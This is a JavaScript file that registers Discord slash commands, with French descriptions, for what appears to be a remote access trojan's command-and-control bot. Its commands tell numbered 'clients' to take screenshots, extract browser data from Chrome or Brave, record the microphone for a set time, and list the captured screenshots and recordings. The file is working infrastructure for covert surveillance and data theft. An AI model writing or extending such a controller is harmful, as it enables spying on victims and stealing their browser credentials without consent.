import {REST, Routes} from 'discord.js';
import config from './static/config.json' assert {type: 'json'};

const { TOKEN, CLIENT_ID, GUILD_ID } = config;

export const commands = [
    {
        name: 'help',
        description: 'Affiche la liste des commandes disponibles.',
    },
    {
        name: 'command',
        description: 'Envoie une commande à un client spécifique.',
        options: [
            {
                name: 'client_id',
                description: 'Le numéro du client.',
                type: 3,
                required: true,
            },
            {
                name: 'command',
                description: 'La commande à envoyer.',
                type: 3,
                required: true,
                choices: [
                    {
                        name: 'screenshot',
                        value: 'screenshot',
                    },
                    {
                        name: 'browserdata',
                        value: 'browserdata',
                    },
                    {
                        name: 'stop',
                        value: 'stop',
                    },
                ],
            }
        ],
    },
    {
        name: 'microphone',
        description: 'Envoie une commande pour activer le microphone d\'un client spécifique.',
        options: [
            {
                name: 'client_id',
                description: 'Le numéro du client.',
                type: 3,
                required: true,
            },
            {
                name: 'duration',
                description: 'La durée de l\'enregistrement en secondes.',
                type: 4,
                required: true,
            }
        ],
    },
    {
        name: 'clients',
        description: 'Liste des clients.',
        options: [
            {
                name: 'status',
                description: 'Filtrer les clients par statut.',
                type: 3,
                required: false,
                choices: [
                    {
                        name: 'En ligne',
                        value: 'online',
                    },
                    {
                        name: 'Hors ligne',
                        value: 'offline',
                    },
                ],
            },
        ],
    },
    {
        name: 'listallscreenshots',
        description: 'Liste de toutes les captures d\'écran.',
    },
    {
        name: 'listallmicrophones',
        description: 'Liste de tous les enregistrements audio.',
    },
    {
        name: 'listbrowserdata',
        description: 'Envoie une commande pour lister les données de navigation d\'un client spécifique.',
        options: [
            {
                name: 'client_id',
                description: 'Le numéro du client.',
                type: 3,
                required: true,
            },
            {
                name: 'browser',
                description: 'Le navigateur à cibler.',
                type: 3,
                required: true,
                choices: [
                    {
                        name: 'Google Chrome',
                        value: 'google-chrome',
                    },
                    {
                        name: 'Brave',
                        value: 'brave',
                    }
                ],
            },
        ],
    },
];

const rest = new REST({ version: '10' }).setToken(TOKEN);

try {
    console.log('Début de la mise à jour des commandes de l\'application (/).');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });

    console.log('Commandes de l\'application (/) mises à jour avec succès.');
} catch (error) {
    console.error(error);
}